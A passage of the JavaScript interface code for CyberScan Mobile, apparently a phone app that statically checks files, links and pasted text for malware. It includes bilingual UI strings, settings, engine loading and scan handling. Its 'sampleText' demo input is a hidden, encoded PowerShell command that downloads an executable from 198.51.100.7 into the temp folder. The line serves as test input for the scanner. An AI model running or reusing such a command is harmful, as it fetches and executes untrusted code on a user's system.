/* CyberScan Mobile: the interface. The engine lives in engine-worker.js,
 * drawings in viz.js, exports in report.js, online lookups in lookup.js and the
 * Android features in native.js (window.CSNative, absent in a browser). */
"use strict";
(function () {
  const $ = (id) => document.getElementById(id);
  const el = (tag, cls, text) => { const n = document.createElement(tag); if (cls) n.className = cls; if (text != null) n.textContent = text; return n; };
  const NATIVE = !!window.CSNative;

  /* ---------------- words ---------------- */
  const T = {
    en: {
      navScan: "Scan", navHistory: "History", navSettings: "Settings",
      tFile: "File", tLink: "Link", tText: "Text", pick: "Choose files", pickHint: (mb) => `One or several · up to ${mb} MB each · stays on this phone`,
      picked: (n, size) => `${n} files · ${size}`,
      sample: "Try a sample", scan: "Check it", scanMany: (n) => `Check ${n} files`, found: "What we found", details: "Details", checks: "Checks",
      pasteLink: "Paste the copied link", clipEmpty: "There's no link on the clipboard",
      s0: "Reading", s1: "Measuring", s2: "Comparing", s3: "Finishing",
      engOff: "On-device engine: not loaded", engOffSub: "Loads the first time you check something (≈ 17 MB, once).",
      engLoading: "Loading the on-device engine…", engReady: "On-device engine ready", engReadySub: (s, y) => `Python ${s}${y ? ` · ${y} YARA rules` : ""} · nothing leaves this phone`,
      engViewer: "Scanning isn't available on this device yet", engViewerSub: "Cloud scanning is coming soon.",
      stages: { runtime: "Starting Python (WebAssembly)…", numpy: "Loading maths library…", engine: "Loading CyberScan's engine…" },
      cloudSoon: "Cloud scanning for older phones: coming soon.",
      noHistory: "Your checks will appear here. They're stored only on this phone.", noMatch: "Nothing matches.", clearHistory: "Clear history", cleared: "History cleared",
      historyOff: "History is turned off in Settings.", exportHistory: "Export history", removed: "Removed",
      verdicts: { NO_INDICATORS_OBSERVED: "CLEAR", REVIEW: "REVIEW", SUSPICIOUS: "SUSPICIOUS" },
      share: "Share", copy: "Copy report", copied: "Copied", repair: "Repair a copy", again: "Check something else", exportBtn: "Export",
      repairTitle: "Repair a copy", repairLede: "Removes parts that don't belong in the file's format from a copy. Your original stays as it is.",
      repairRun: "Repair", cancel: "Cancel", close: "Close", repairNone: "Nothing in this file needs removing.", repairDone: "Repaired copy ready",
      repairSave: "Save the copy", repairShare: "Share the copy", repairFail: "Nothing was written",
      mapTitle: "Inside the file", mapLow: "Plain", mapMid: "Code / data", mapHigh: "Packed or encrypted", mapFlag: "Flagged",
      mapStats: (m, p) => `average ${m} · peak ${p} / 8`, mapNote: (c, f) => `${c} parts${f ? ` · ${f} flagged by the engine` : ""}. Brighter = more random bytes, typical of compressed, packed or encrypted content.`,
      yaraTitle: "Known-pattern rules (YARA)", yaraNone: "No rule matched.", peTitle: "Program details", peSections: "Sections", peImports: "Unusual imports", peNone: "Not a Windows program.",
      fpTitle: "Fingerprints", fpCopy: "Tap a fingerprint to copy it", enginesTitle: "Engines",
      lookupTitle: "Public threat lists", lookupRun: "Look it up", lookupAgain: "Look up again", lookupOff: "Turned off. You can turn on online lookups in Settings.",
      lookupWeb: "Online lookups are available in the Android app.", lookupNoKey: "Add a free abuse.ch key in Settings to look this up.",
      lookupNothing: "Pasted text isn't looked up online: only files (by fingerprint) and links are.", lookupSent: (what) => `Sent: ${what} only.`,
      lookupBusy: "Looking it up…", lookupFound: "Listed", lookupClean: "Not listed", lookupError: "Couldn't check",
      st: { found: "LISTED", clean: "NOT LISTED", error: "ERROR" },
      exportTitle: "Export the report", xHtml: "Report page (.html)", xHtmlSub: "Opens in any browser; good for sharing or printing", xTxt: "Plain text (.txt)", xTxtSub: "The full technical report",
      xJson: "Data (.json)", xJsonSub: "Everything, for tools and analysts", xShare: "Share instead of save", saved: (w) => `Saved to ${w}`,
      batchTitle: (n) => `${n} files`, batchCount: (d, n) => `${d} of ${n}`, batchStop: "Stop", batchNew: "Check something else", backBatch: "‹ All files",
      bWait: "Waiting", bRun: "Checking…", bSkip: "Too large for this phone", bErr: "Couldn't check", batchDone: (b, w) => `Done · ${b} suspicious · ${w} to review`,
      insTotal: "checks", insBad: "suspicious", insWarn: "to review", insOk: "clear", fAll: "All", fBad: "Suspicious", fWarn: "Review", fOk: "Clear", search: "Search your checks…",
      setGeneral: "General", setLang: "Language", setHaptics: "Vibration", setHapticsSub: "A short buzz on taps and results",
      setWarm: "Get the engine ready at start", setWarmSub: "The first check starts faster; uses a little battery when the app opens",
      setHistory: "Keep a history", setHistorySub: "Saved only on this phone",
      setOnline: "Online lookups", setLookups: "Check public threat lists", setLookupsSub: "Off by default. Only a fingerprint (SHA-256) or the link is sent — never the file.",
      keyAbuse: "abuse.ch Auth-Key (MalwareBazaar, URLhaus, ThreatFox)", keyOtx: "AlienVault OTX key (optional)",
      keysNote: "Keys are encrypted with the phone's secure key store and never leave it, except to the service they belong to. Get a free abuse.ch key at auth.abuse.ch.",
      keysSave: "Save keys", keysClear: "Remove keys", keysSaved: "Keys saved", keysRemoved: "Keys removed", onlineWeb: "Online lookups are available in the Android app.",
      setSecurity: "Privacy & security", setLock: "App lock", setLockSub: "Ask for your fingerprint, face or screen lock to open CyberScan",
      setSecure: "Hide in recent apps", setSecureSub: "Blocks screenshots and blurs CyberScan in the app switcher", lockUnavailable: "Set up a screen lock on this phone first.",
      privacy: "Privacy policy", privacySub: "What CyberScan does with your data: nothing leaves the phone unless you turn on lookups",
      wipe: "Erase all app data", wipeSub: "History, settings and saved keys", wipeAsk: "Erase your history, settings and saved keys? This can't be undone.", wiped: "Everything was erased",
      lockTitle: "CyberScan is locked", lockText: "Unlock with your fingerprint, face or screen lock.", unlock: "Unlock", lockReason: "Unlock CyberScan",
      deviceTitle: "This device", installTitle: "Install", aboutTitle: "About", licenses: "Open-source licences",
      aboutText: "CyberScan reads files without running them, explains what it finds in plain words, and can remove harmful parts from a copy. The analysis runs on this phone; your files are not uploaded.",
      disclaimer: "CyberScan is a static-analysis tool that helps you decide; it doesn't replace an antivirus or your own judgement, and no tool can prove a file is safe.",
      version: (v) => `Version ${v}`,
      loadEngine: "Load the engine now", engineLoaded: "Engine loaded",
      tiers: {
        full: ["FULL", "This phone can run the complete engine on the device, including files up to 40 MB."],
        light: ["LIGHT", "This phone runs the engine on demand with files up to 8 MB, and with fewer animations to save battery."],
        viewer: ["VIEWER", "This browser can't run the engine on the device. You can still read the app; cloud scanning is coming soon."],
      },
      caps: { platform: "Platform", tier: "Mode", memoryGB: "Memory", cores: "Processor cores", network: "Network", freeMB: "Free storage", webgl: "3D graphics", standalone: "Installed", benchmarkMs: "Benchmark", screen: "Screen", wasm: "WebAssembly", yara: "YARA rules", python: "Python" },
      yes: "Yes", no: "No", unknown: "Not reported",
      installIos: ["Tap the Share button in Safari.", "Choose “Add to Home Screen”.", "Open CyberScan from your home screen: it runs full-screen, like an app."],
      installAndroid: ["Tap “Install app” below, or Chrome's menu › Install app.", "CyberScan appears in your app drawer.", "Share a file from any app to CyberScan to check it."],
      installOther: ["Open this page on your phone.", "Add it to your home screen from the browser menu."],
      installBtn: "Install app", installed: "Installed — open it from your home screen",
      tooBig: (mb) => `This file is larger than ${mb} MB, the limit for this device.`,
      failed: "The check couldn't finish: ", shared: "Received from another app", sharedMany: (n) => `${n} files received`,
      onPhone: "On this phone", pasted: "Pasted text", noSigns: "No warning signs.",
      sampleText: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA; Invoke-WebRequest http://198.51.100.7/update.exe -OutFile $env:TEMP\\update.exe",
      textPlaceholder: "Paste a script, a message or a command…",
    },
    ar: {
      navScan: "فحص", navHistory: "السجل", navSettings: "الإعدادات",
      tFile: "ملف", tLink: "رابط", tText: "نص", pick: "اختر ملفات", pickHint: (mb) => `ملف أو أكثر · حتى ${mb} ميغابايت لكل ملف · تبقى على هذا الهاتف`,
      picked: (n, size) => `${n} ملفات · ${size}`,
      sample: "جرّب مثالًا", scan: "افحصه", scanMany: (n) => `افحص ${n} ملفات`, found: "ما وجدناه", details: "التفاصيل", checks: "الفحوصات",
      pasteLink: "الصق الرابط المنسوخ", clipEmpty: "لا يوجد رابط في الحافظة",
      s0: "القراءة", s1: "القياس", s2: "المقارنة", s3: "الإنهاء",
      engOff: "المحرك على الجهاز: غير محمّل", engOffSub: "يُحمّل عند أول فحص (≈ 17 ميغابايت، مرة واحدة).",
      engLoading: "جارٍ تحميل المحرك على الجهاز…", engReady: "المحرك على الجهاز جاهز", engReadySub: (s, y) => `Python ${s}${y ? ` · ${y} قواعد YARA` : ""} · لا شيء يغادر هذا الهاتف`,
      engViewer: "الفحص غير متاح على هذا الجهاز بعد", engViewerSub: "الفحص السحابي قادم قريبًا.",
      stages: { runtime: "تشغيل Python (WebAssembly)…", numpy: "تحميل مكتبة الحساب…", engine: "تحميل محرك CyberScan…" },
      cloudSoon: "الفحص السحابي للهواتف القديمة: قريبًا.",
      noHistory: "ستظهر فحوصاتك هنا. تُحفظ على هذا الهاتف فقط.", noMatch: "لا توجد نتائج مطابقة.", clearHistory: "مسح السجل", cleared: "تم مسح السجل",
      historyOff: "السجل مُطفأ من الإعدادات.", exportHistory: "تصدير السجل", removed: "تم الحذف",
      verdicts: { NO_INDICATORS_OBSERVED: "سليم", REVIEW: "للمراجعة", SUSPICIOUS: "مشبوه" },
      share: "مشاركة", copy: "نسخ التقرير", copied: "تم النسخ", repair: "أصلح نسخة", again: "افحص شيئًا آخر", exportBtn: "تصدير",
      repairTitle: "إصلاح نسخة", repairLede: "يزيل من نسخة الأجزاءَ التي لا تنتمي إلى صيغة الملف. ملفك الأصلي يبقى كما هو.",
      repairRun: "أصلح", cancel: "إلغاء", close: "إغلاق", repairNone: "لا يوجد في هذا الملف ما يحتاج إزالة.", repairDone: "النسخة المُصلحة جاهزة",
      repairSave: "احفظ النسخة", repairShare: "شارك النسخة", repairFail: "لم يُكتب شيء",
      mapTitle: "داخل الملف", mapLow: "عادي", mapMid: "شيفرة / بيانات", mapHigh: "مضغوط أو مشفّر", mapFlag: "مُعلَّم",
      mapStats: (m, p) => `المتوسط ${m} · الأعلى ${p} / 8`, mapNote: (c, f) => `${c} جزءًا${f ? ` · ${f} علّمها المحرك` : ""}. الأفتح = بايتات أكثر عشوائية، كما في المحتوى المضغوط أو المحزوم أو المشفّر.`,
      yaraTitle: "قواعد الأنماط المعروفة (YARA)", yaraNone: "لم تنطبق أي قاعدة.", peTitle: "تفاصيل البرنامج", peSections: "الأقسام", peImports: "استدعاءات غير معتادة", peNone: "ليس برنامج Windows.",
      fpTitle: "البصمات", fpCopy: "اضغط على بصمة لنسخها", enginesTitle: "المحركات",
      lookupTitle: "قوائم التهديدات العامة", lookupRun: "ابحث عنه", lookupAgain: "ابحث مجددًا", lookupOff: "مُطفأ. يمكنك تشغيل البحث عبر الإنترنت من الإعدادات.",
      lookupWeb: "البحث عبر الإنترنت متاح في تطبيق Android.", lookupNoKey: "أضف مفتاح abuse.ch المجاني من الإعدادات للبحث عن هذا.",
      lookupNothing: "النص الملصوق لا يُبحث عنه عبر الإنترنت: فقط الملفات (ببصمتها) والروابط.", lookupSent: (what) => `ما أُرسل: ${what} فقط.`,
      lookupBusy: "جارٍ البحث…", lookupFound: "مُدرج", lookupClean: "غير مُدرج", lookupError: "تعذّر التحقق",
      st: { found: "مُدرج", clean: "غير مُدرج", error: "خطأ" },
      exportTitle: "تصدير التقرير", xHtml: "صفحة تقرير (.html)", xHtmlSub: "تُفتح في أي متصفح؛ مناسبة للمشاركة والطباعة", xTxt: "نص عادي (.txt)", xTxtSub: "التقرير التقني الكامل",
      xJson: "بيانات (.json)", xJsonSub: "كل شيء، للأدوات والمحللين", xShare: "شارك بدل الحفظ", saved: (w) => `حُفظ في ${w}`,
      batchTitle: (n) => `${n} ملفات`, batchCount: (d, n) => `${d} من ${n}`, batchStop: "إيقاف", batchNew: "افحص شيئًا آخر", backBatch: "› كل الملفات",
      bWait: "بالانتظار", bRun: "جارٍ الفحص…", bSkip: "أكبر من حد هذا الهاتف", bErr: "تعذّر الفحص", batchDone: (b, w) => `انتهى · ${b} مشبوه · ${w} للمراجعة`,
      insTotal: "فحص", insBad: "مشبوه", insWarn: "للمراجعة", insOk: "سليم", fAll: "الكل", fBad: "مشبوه", fWarn: "للمراجعة", fOk: "سليم", search: "ابحث في فحوصاتك…",
      setGeneral: "عام", setLang: "اللغة", setHaptics: "الاهتزاز", setHapticsSub: "اهتزاز قصير عند اللمس وظهور النتائج",
      setWarm: "جهّز المحرك عند الفتح", setWarmSub: "يبدأ أول فحص أسرع؛ يستهلك قليلًا من البطارية عند فتح التطبيق",
      setHistory: "احتفظ بسجل", setHistorySub: "يُحفظ على هذا الهاتف فقط",
      setOnline: "البحث عبر الإنترنت", setLookups: "تحقق من قوائم التهديدات العامة", setLookupsSub: "مُطفأ افتراضيًا. تُرسل البصمة (SHA-256) أو الرابط فقط — وليس الملف أبدًا.",
      keyAbuse: "مفتاح abuse.ch ‏(MalwareBazaar وURLhaus وThreatFox)", keyOtx: "مفتاح AlienVault OTX (اختياري)",
      keysNote: "تُشفّر المفاتيح بمخزن المفاتيح الآمن في الهاتف ولا تغادره إلا إلى الخدمة التي تخصها. احصل على مفتاح abuse.ch مجاني من auth.abuse.ch.",
      keysSave: "احفظ المفاتيح", keysClear: "احذف المفاتيح", keysSaved: "حُفظت المفاتيح", keysRemoved: "حُذفت المفاتيح", onlineWeb: "البحث عبر الإنترنت متاح في تطبيق Android.",
      setSecurity: "الخصوصية والأمان", setLock: "قفل التطبيق", setLockSub: "اطلب البصمة أو الوجه أو قفل الشاشة لفتح CyberScan",
      setSecure: "إخفاء في التطبيقات الأخيرة", setSecureSub: "يمنع لقطات الشاشة ويُخفي CyberScan في مبدّل التطبيقات", lockUnavailable: "فعّل قفل الشاشة في هذا الهاتف أولًا.",
      privacy: "سياسة الخصوصية", privacySub: "ماذا يفعل CyberScan ببياناتك: لا شيء يغادر الهاتف إلا إذا شغّلت البحث",
      wipe: "امسح كل بيانات التطبيق", wipeSub: "السجل والإعدادات والمفاتيح المحفوظة", wipeAsk: "مسح السجل والإعدادات والمفاتيح المحفوظة؟ لا يمكن التراجع.", wiped: "تم مسح كل شيء",
      lockTitle: "CyberScan مقفل", lockText: "افتحه بالبصمة أو الوجه أو قفل الشاشة.", unlock: "افتح", lockReason: "افتح CyberScan",
      deviceTitle: "هذا الجهاز", installTitle: "التثبيت", aboutTitle: "عن التطبيق", licenses: "تراخيص المصادر المفتوحة",
      aboutText: "يقرأ CyberScan الملفات دون تشغيلها، ويشرح ما يجده بكلمات بسيطة، ويستطيع إزالة الأجزاء الضارة من نسخة. يجري التحليل على هذا الهاتف؛ ملفاتك لا تُرفع.",
      disclaimer: "CyberScan أداة تحليل ثابت تساعدك على القرار؛ لا تحل محل برنامج مكافحة الفيروسات أو حكمك الشخصي، ولا توجد أداة تستطيع إثبات أن ملفًا آمن.",
      version: (v) => `الإصدار ${v}`,
      loadEngine: "حمّل المحرك الآن", engineLoaded: "تم تحميل المحرك",
      tiers: {
        full: ["كامل", "يستطيع هذا الهاتف تشغيل المحرك كاملًا على الجهاز، مع ملفات حتى 40 ميغابايت."],
        light: ["خفيف", "يشغّل هذا الهاتف المحرك عند الطلب مع ملفات حتى 8 ميغابايت، وبحركة أقل لتوفير البطارية."],
        viewer: ["عرض فقط", "هذا المتصفح لا يستطيع تشغيل المحرك على الجهاز. يمكنك تصفح التطبيق؛ والفحص السحابي قادم قريبًا."],
      },
      caps: { platform: "النظام", tier: "الوضع", memoryGB: "الذاكرة", cores: "أنوية المعالج", network: "الشبكة", freeMB: "المساحة المتاحة", webgl: "رسوم ثلاثية الأبعاد", standalone: "مثبّت", benchmarkMs: "اختبار السرعة", screen: "الشاشة", wasm: "WebAssembly", yara: "قواعد YARA", python: "Python" },
      yes: "نعم", no: "لا", unknown: "غير معروف",
      installIos: ["اضغط زر المشاركة في Safari.", "اختر «إضافة إلى الشاشة الرئيسية».", "افتح CyberScan من الشاشة الرئيسية: يعمل بملء الشاشة كتطبيق."],
      installAndroid: ["اضغط «ثبّت التطبيق» بالأسفل، أو قائمة Chrome ‹ تثبيت التطبيق.", "يظهر CyberScan بين تطبيقاتك.", "شارك ملفًا من أي تطبيق إلى CyberScan لفحصه."],
      installOther: ["افتح هذه الصفحة على هاتفك.", "أضفها إلى الشاشة الرئيسية من قائمة المتصفح."],
      installBtn: "ثبّت التطبيق", installed: "تم التثبيت — افتحه من الشاشة الرئيسية",
      tooBig: (mb) => `هذا الملف أكبر من ${mb} ميغابايت، وهو حد هذا الجهاز.`,
      failed: "تعذّر إكمال الفحص: ", shared: "وصل من تطبيق آخر", sharedMany: (n) => `وصلت ${n} ملفات`,
      onPhone: "على الجهاز", pasted: "نص ملصوق", noSigns: "لا توجد علامات تحذير.",
      sampleText: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA; Invoke-WebRequest http://198.51.100.7/update.exe -OutFile $env:TEMP\\update.exe",
      textPlaceholder: "الصق سكربتًا أو رسالة أو أمرًا…",
    },
  };
  let lang = "en";
  try { lang = localStorage.getItem("cyberscan-lang") === "ar" ? "ar" : "en"; } catch { /* storage off */ }
  const t = (k) => (T[lang][k] !== undefined ? T[lang][k] : T.en[k]);

  /* ---------------- preferences (this phone only) ---------------- */
  const PKEY = "csm-prefs";
  const DEFAULTS = { haptics: true, warm: false, history: true, lookups: false, lock: false, secure: false };
  let prefs = { ...DEFAULTS };
  try { prefs = { ...DEFAULTS, ...JSON.parse(localStorage.getItem(PKEY) || "{}") }; } catch { /* defaults */ }
  const savePrefs = () => { try { localStorage.setItem(PKEY, JSON.stringify(prefs)); } catch { /* storage off */ } };

  /* ---------------- state ---------------- */
  const S = { view: "scan", mode: "file", files: [], caps: null, engine: "off", last: null, lastFile: null, worker: null, nextId: 1, pending: new Map(), repair: null, batch: null, filter: "all", keys: { abuse: "", otx: "" } };
  const platform = window.CSCaps.ios ? "ios" : window.CSCaps.android ? "android" : "other";
  document.body.classList.add(platform);
  if (NATIVE) document.body.classList.add("native");

  /* ---------------- language ---------------- */
  function applyLang() {
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === "ar" ? "rtl" : "ltr";
    document.querySelectorAll("[data-t]").forEach((n) => { const v = t(n.dataset.t); if (typeof v === "string") n.textContent = v; });
    $("lang-toggle").textContent = lang === "ar" ? "EN" : "ع";
    $("text").placeholder = t("textPlaceholder");
    $("h-search").placeholder = t("search");
    $("cloud-note").textContent = S.caps && S.caps.tier === "viewer" ? t("cloudSoon") : "";
    document.querySelectorAll("#set-lang .seg-btn").forEach((b) => b.classList.toggle("on", b.dataset.l === lang));
    setTitle();
    renderEngine();
    renderPicker();
    if (S.caps) renderCaps();
    renderInstall();
    renderVersion();
    if (S.last && !$("result").hidden) renderResult(S.last, false);
    if (S.batch && !$("batch").hidden) renderBatch();
    if (S.view === "history") renderHistory();
  }
  function setLang(l) { lang = l; try { localStorage.setItem("cyberscan-lang", l); localStorage.setItem("cs-lang-chosen", "1"); } catch { /* storage off */ } applyLang(); }
  $("lang-toggle").addEventListener("click", () => setLang(lang === "ar" ? "en" : "ar"));
  document.querySelectorAll("#set-lang .seg-btn").forEach((b) => b.addEventListener("click", () => setLang(b.dataset.l)));
  function firstRun() {
    let chosen = false;
    try { chosen = localStorage.getItem("cs-lang-chosen") === "1"; } catch { /* storage off */ }
    if (chosen) return;
    const sheet = $("lang-sheet");
    sheet.hidden = false;
    sheet.querySelectorAll(".choice").forEach((b) => b.addEventListener("click", () => { setLang(b.dataset.lang); sheet.hidden = true; }));
  }

  /* ---------------- feedback ---------------- */
  function toast(msg) {
    const n = $("toast"); n.textContent = msg; n.hidden = false;
    clearTimeout(toast.t); toast.t = setTimeout(() => { n.hidden = true; }, 2600);
  }
  const buzz = (pattern) => {
    if (!prefs.haptics || !S.caps || !S.caps.vibrate) return;
    if (navigator.userActivation && !navigator.userActivation.hasBeenActive) return; // browsers refuse before the first tap
    try { navigator.vibrate(pattern); } catch { /* ignore */ }
  };
  if (platform === "android") {
    document.addEventListener("pointerdown", (e) => {
      const b = e.target.closest("button, .picker, .set-row");
      if (!b || b.disabled) return;
      const r = b.getBoundingClientRect(), s = Math.max(r.width, r.height) * 2;
      const rip = el("span", "ripple");
      Object.assign(rip.style, { width: `${s}px`, height: `${s}px`, left: `${e.clientX - r.left - s / 2}px`, top: `${e.clientY - r.top - s / 2}px` });
      if (getComputedStyle(b).position === "static") b.style.position = "relative";
      b.style.overflow = "hidden"; b.append(rip); rip.addEventListener("animationend", () => rip.remove());
    });
  }
  const fmtBytes = (n) => (n < 1024 ? `${n} B` : n < 1048576 ? `${(n / 1024).toFixed(0)} KB` : `${(n / 1048576).toFixed(1)} MB`);
  const copyText = (text) => {
    const done = () => { toast(t("copied")); buzz(8); };
    if (navigator.clipboard && navigator.clipboard.writeText) return navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
    fallbackCopy(text, done);
    return Promise.resolve();
  };
  function fallbackCopy(text, done) {
    const ta = el("textarea"); ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0"; document.body.append(ta); ta.select();
    try { document.execCommand("copy"); done(); } catch { /* nothing */ } ta.remove();
  }

  /* ---------------- navigation ---------------- */
  const VIEWS = ["scan", "history", "settings"];
  function setTitle() {
    const titles = { scan: t("navScan"), history: t("navHistory"), settings: t("navSettings") };
    $("large-title").textContent = titles[S.view];
    $("bar-title").textContent = S.view === "scan" ? "CyberScan" : titles[S.view];
  }
  function go(view) {
    S.view = view;
    document.querySelectorAll(".tab").forEach((b) => { const on = b.dataset.view === view; b.classList.toggle("on", on); b.setAttribute("aria-current", on ? "page" : "false"); });
    VIEWS.forEach((v) => { $(`v-${v}`).hidden = v !== view; });
    setTitle();
    if (view === "history") renderHistory();
    if (view === "settings") { renderSettings(); renderCaps(); renderInstall(); }
    window.scrollTo({ top: 0 });
  }
  document.querySelectorAll(".tab").forEach((b) => b.addEventListener("click", () => { buzz(8); go(b.dataset.view); }));
  window.addEventListener("scroll", () => document.body.classList.toggle("scrolled", scrollY > 40), { passive: true });

  /* ---------------- engine ---------------- */
  function worker() {
    if (S.worker) return S.worker;
    S.worker = new Worker("engine-worker.js", { type: "module" });
    S.worker.onmessage = (e) => {
      const m = e.data, job = S.pending.get(m.id);
      if (!job) return;
      if (m.type === "progress") { job.onProgress && job.onProgress(m); return; }
      S.pending.delete(m.id);
      if (m.type === "done") job.resolve(m); else job.reject(new Error(m.error));
    };
    S.worker.onerror = (e) => { S.pending.forEach((j) => j.reject(new Error(e.message || "worker error"))); S.pending.clear(); };
    return S.worker;
  }
  function call(msg, onProgress, transfer) {
    const id = S.nextId++;
    return new Promise((resolve, reject) => {
      S.pending.set(id, { resolve, reject, onProgress });
      worker().postMessage({ ...msg, id }, transfer || []);
    });
  }

  let engineInfo = null, engineStage = "", enginePromise = null;
  function renderEngine() {
    const dot = $("engine-dot"), title = $("engine-title"), sub = $("engine-sub"), bar = $("engine-bar");
    dot.className = "dot";
    if (S.caps && S.caps.tier === "viewer") { dot.classList.add("off"); title.textContent = t("engViewer"); sub.textContent = t("engViewerSub"); bar.style.width = "0"; return; }
    if (S.engine === "ready") {
      dot.classList.add("ready"); title.textContent = t("engReady");
      sub.textContent = t("engReadySub")(engineInfo ? engineInfo.python : "3", engineInfo && engineInfo.yara ? engineInfo.yara.rules : 0);
      bar.style.width = "0"; return;
    }
    if (S.engine === "loading") { dot.classList.add("loading"); title.textContent = t("engLoading"); sub.textContent = t("stages")[engineStage] || ""; bar.style.width = { runtime: "25%", numpy: "60%", engine: "85%" }[engineStage] || "10%"; return; }
    title.textContent = t("engOff"); sub.textContent = t("engOffSub"); bar.style.width = "0";
  }
  function loadEngine() {
    if (enginePromise) return enginePromise;
    S.engine = "loading"; engineStage = "runtime"; renderEngine();
    enginePromise = call({ type: "init" }, (p) => { engineStage = p.stage; renderEngine(); })
      .then(async (m) => {
        engineInfo = m.result; S.engine = "ready"; renderEngine();
        // a short real scan tells us how fast this phone actually is
        const b = await call({ type: "scan", kind: "text", value: "benchmark http://example.com/a.exe", display: "benchmark", maxBytes: 1e6 });
        window.CSCaps.adjustAfterBenchmark(S.caps, b.ms);
        document.body.className = document.body.className.replace(/tier-\w+/, `tier-${S.caps.tier}`);
        renderPicker();
        if (S.view === "settings") renderCaps();
        return m;
      })
      .catch((err) => { S.engine = "off"; enginePromise = null; renderEngine(); toast(t("failed") + err.message); throw err; });
    return enginePromise;
  }
  $("load-engine").addEventListener("click", () => loadEngine().then(() => { toast(t("engineLoaded")); renderCaps(); }).catch(() => {}));

  /* ---------------- compose ---------------- */
  function setMode(mode) {
    S.mode = mode;
    document.querySelectorAll(".seg-btn[data-mode]").forEach((x) => { const on = x.dataset.mode === mode; x.classList.toggle("on", on); x.setAttribute("aria-selected", String(on)); });
    document.querySelectorAll("[data-panel]").forEach((p) => { p.hidden = p.dataset.panel !== mode; });
    ready();
  }
  document.querySelectorAll(".seg-btn[data-mode]").forEach((b) => b.addEventListener("click", () => { setMode(b.dataset.mode); buzz(6); }));
  const limitBytes = () => window.CSCaps.LIMITS[(S.caps && S.caps.tier) || "light"];
  function renderPicker() {
    if (S.files.length === 1) $("picker-label").textContent = `${S.files[0].name} · ${fmtBytes(S.files[0].size)}`;
    else if (S.files.length > 1) $("picker-label").textContent = t("picked")(S.files.length, fmtBytes(S.files.reduce((a, f) => a + f.size, 0)));
    else $("picker-label").textContent = t("pick");
    $("picker").classList.toggle("chosen", S.files.length > 0);
    $("picker-hint").textContent = S.caps && S.caps.tier !== "viewer" ? t("pickHint")(Math.round(limitBytes() / 1048576)) : t("cloudSoon");
    $("go").firstElementChild.textContent = S.mode === "file" && S.files.length > 1 ? t("scanMany")(S.files.length) : t("scan");
  }
  function chooseFiles(files, note) {
    files = [...(files || [])].filter(Boolean);
    if (!files.length) return;
    S.files = files;
    if (S.view !== "scan") go("scan");
    showCompose();
    setMode("file");
    renderPicker();
    if (note) toast(note);
    ready();
    if (S.caps && S.caps.tier !== "viewer") loadEngine().catch(() => {}); // warm up while the person decides
  }
  $("file").addEventListener("change", (e) => chooseFiles(e.target.files));
  $("url").addEventListener("input", ready);
  $("text").addEventListener("input", ready);
  $("sample").addEventListener("click", () => { $("text").value = t("sampleText"); ready(); });
  $("paste-link").addEventListener("click", pasteLink);
  async function pasteLink() {
    let text = "";
    try { text = NATIVE ? await CSNative.clipboard() : await navigator.clipboard.readText(); } catch { /* not allowed */ }
    const m = String(text || "").match(/https?:\/\/[^\s"'<>]+/i) || String(text || "").match(/\b(?:[a-z0-9-]+\.)+[a-z]{2,}(?:\/[^\s"'<>]*)?/i);
    if (!m) { toast(t("clipEmpty")); return; }
    setMode("url"); $("url").value = m[0]; ready();
  }
  function ready() {
    const ok = S.caps && S.caps.tier !== "viewer" && (S.mode === "file" ? S.files.length > 0 : S.mode === "url" ? $("url").value.trim().length > 4 : $("text").value.trim().length > 0);
    $("go").disabled = !ok;
    renderPicker();
  }
  function showCompose() {
    $("result").hidden = true; $("batch").hidden = true; $("progress").hidden = true; $("compose").hidden = false;
  }

  /* ---------------- scanning ---------------- */
  $("go").addEventListener("click", () => (S.mode === "file" && S.files.length > 1 ? startBatch(S.files) : scan()));
  async function scan() {
    const file = S.files[0];
    if (S.mode === "file" && file.size > limitBytes()) { toast(t("tooBig")(Math.round(limitBytes() / 1048576))); return; }
    buzz(12);
    $("compose").hidden = true; $("result").hidden = true; $("progress").hidden = false;
    setSteps([]); $("p-detail").textContent = ""; $("p-pct").textContent = "0%";
    let pct = 0;
    const tick = setInterval(() => { pct = Math.min(pct + 1, 95); $("p-pct").textContent = `${pct}%`; }, 120);
    try {
      await loadEngine();
      const steps = [];
      const onProgress = (p) => {
        if (p.stage !== "scan") { $("p-detail").textContent = t("stages")[p.stage] || ""; return; }
        steps[p.index] = p.state; setSteps(steps); $("p-detail").textContent = p.detail;
        pct = Math.max(pct, (steps.filter((s) => s === "complete").length / 4) * 100 - 5);
      };
      let r;
      if (S.mode === "file") {
        const buffer = await file.arrayBuffer();
        S.lastFile = { name: file.name, buffer: buffer.slice(0) };
        r = (await call({ type: "scan", kind: "file", name: file.name, display: file.name, buffer, maxBytes: limitBytes() }, onProgress, [buffer])).result;
      } else {
        const value = $(S.mode).value.trim();
        S.lastFile = null;
        r = (await call({ type: "scan", kind: S.mode, value, display: S.mode === "url" ? value : t("pasted"), maxBytes: limitBytes() }, onProgress)).result;
      }
      S.batch = null;
      finish(r);
    } catch (err) {
      $("progress").hidden = true; $("compose").hidden = false; toast(t("failed") + err.message);
    } finally { clearInterval(tick); }
  }
  function setSteps(steps) { [...$("steps").children].forEach((li, i) => { li.className = steps[i] || ""; }); }
  function finish(r) {
    $("p-pct").textContent = "100%";
    r.when = new Date().toISOString();
    S.last = r;
    saveHistory(r);
    setTimeout(() => { $("progress").hidden = true; renderResult(r, true); autoLookup(r); }, 350);
    buzz(r.classification === "SUSPICIOUS" ? [40, 60, 40, 60, 80] : r.classification === "REVIEW" ? [30, 50, 30] : [15]);
  }

  /* ---------------- several files ---------------- */
  async function startBatch(files) {
    buzz(12);
    S.batch = { items: files.map((file) => ({ file, status: "wait", result: null })), stop: false, running: true };
    $("compose").hidden = true; $("result").hidden = true; $("batch").hidden = false;
    renderBatch();
    try { await loadEngine(); } catch { S.batch.running = false; renderBatch(); return; }
    for (const item of S.batch.items) {
      if (S.batch.stop) break;
      if (item.file.size > limitBytes()) { item.status = "skip"; renderBatch(); continue; }
      item.status = "run"; renderBatch();
      try {
        const buffer = await item.file.arrayBuffer();
        item.buffer = buffer.slice(0);
        const r = (await call({ type: "scan", kind: "file", name: item.file.name, display: item.file.name, buffer, maxBytes: limitBytes() }, null, [buffer])).result;
        r.when = new Date().toISOString();
